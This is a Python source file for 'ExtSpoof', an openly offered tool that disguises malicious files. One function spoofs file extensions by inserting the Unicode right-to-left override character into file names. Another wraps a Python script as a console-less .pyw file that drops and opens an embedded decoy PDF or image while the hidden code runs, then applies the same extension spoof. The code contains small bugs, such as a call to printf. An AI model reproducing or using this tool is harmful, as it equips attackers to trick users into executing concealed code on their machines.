#!/usr/bin/python3

"""
  Copyright (C) 2021-2022, Loubaris

  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You must obey the GNU General Public License. If you will modify
  this file(s), you may extend this exception to your version
  of the file(s), but you are not obligated to do so.  If you do not
  wish to do so, delete this exception statement from your version.
  If you delete this exception statement from all source files in the
  program, then also delete it here.

  Contact:

          Mail: adamou.loubaris@gmail.com

"""


import os
import time
import sys
import base64

logo = """


@@@@@@@@ @@@  @@@ @@@@@@@     @@@@@@ @@@@@@@   @@@@@@   @@@@@@  @@@@@@@@
@@!      @@!  !@@   @!!      !@@     @@!  @@@ @@!  @@@ @@!  @@@ @@!
@!!!:!    !@@!@!    @!!       !@@!!  @!@@!@!  @!@  !@! @!@  !@! @!!!:!
!!:       !: :!!    !!:          !:! !!:      !!:  !!! !!:  !!! !!:
: :: ::  :::  :::    :       ::.: :   :        : :. :   : :. :   :


 made by Loubaris | github.com/Loubaris

"""


menu = """
Commands
 - rlt <filename> <new_extension> | Spoof extension using rlt exploit
 - ctm <python_file> <fake_file_to_open.pdf|png|etc>
   Create a pdf|png|etc file that runs python code w/o console.

 - exit                           | Exit program
API
 - 'from extspoof import rlt'
 - 'rlt("filename new_extension")'
(ExtSpoof)>"""


def rlt(command):
    print("(ExtSpoof) - Starting Right To Left module.\n")
    try:
        command = command.split(" ")
    except Exception as e:
        pass
    for i in range(5):
        try:
            command[i]
        except Exception as e:
            command.append("")
    argv1 = command[1]
    argv2 = command[2]
    if os.path.exists(argv1):
        argv1_splitted = argv1.split(".")
        new_file_name = (argv1_splitted[0]+str("\u202E")+str(argv2[::-1])+"."+str(argv1_splitted[1]))
        try:
            os.rename(argv1, new_file_name)
            print("(ExtSpoof) - Successfully spoofed")
        except Exception as e:
            printf("Error while renaming\nError: {e}")

    else:
        print("(ExtSpoof) - File was not found.")


def ctm(command):
    print("(ExtSpoof) - Starting python code hiddener module.\n")
    try:
        command = command.split(" ")
    except Exception as e:
        pass
    for i in range(5):
        try:
            command[i]
        except Exception as e:
            command.append("")
    argv1 = command[1]
    argv2 = command[2]
    if os.path.exists(argv1):
        os.rename(argv1, str(argv1+"w"))
        if os.path.exists(argv2):
            argv1 = str(argv1)+"w"
            f = open(argv1, "r")
            contents = f.readlines()
            contents.insert(0, f"import base64, os\n")
            pdf_f = open(f"{argv2}", "br")
            pdfcontent = pdf_f.read()
            pdf_f.close()
            contents.insert(1, f"f = open('{argv2}', 'w')\n")
            encoded_pdf = str(pdfcontent).encode('ascii')
            b64_pdf = base64.b64encode(encoded_pdf)
            b64_pdf = b64_pdf.decode('ascii')
            contents.insert(2, f"b64 = '''\n{b64_pdf}\n'''\n")
            contents.insert(3, f"b64 = b64.encode('ascii')\n")
            contents.insert(4, f"b64_decoded = base64.b64decode(b64)\n")
            contents.insert(5, f"b64_decoded = b64_decoded.decode('ascii')\n")
            contents.insert(6, f"f.write(b64_decoded)\n")
            contents.insert(7, f"f.close()\n")
            contents.insert(8, f"os.system('start {argv2}')\n")
            f.close()
            f = open(argv1, "w")
            f.write("".join(contents))
            f.close()
            argv2 = argv2.split(".")
            rlt(f"rlt {argv1} {argv2[1]}")

    else:
        print("(ExtSpoof) - File was not found.")


def extspoof():
    os.system("cls")
    print(logo)
    command = input(menu)
    command = command.split(" ")
    if command[0] == "rlt":
        rlt(command)
    elif command[0] == "ctm":
        ctm(command)
    else:
        print("(ExtSpoof) - Unknown command")
        os.system("set /p DUMMY=Press Enter to continue")
        extspoof()

    if command[0] != "exit":
        os.system("set /p DUMMY=Press Enter to continue")
    else:
        sys.exit()
    os.system("cls")
    extspoof()


if __name__ == "__main__":
    extspoof()
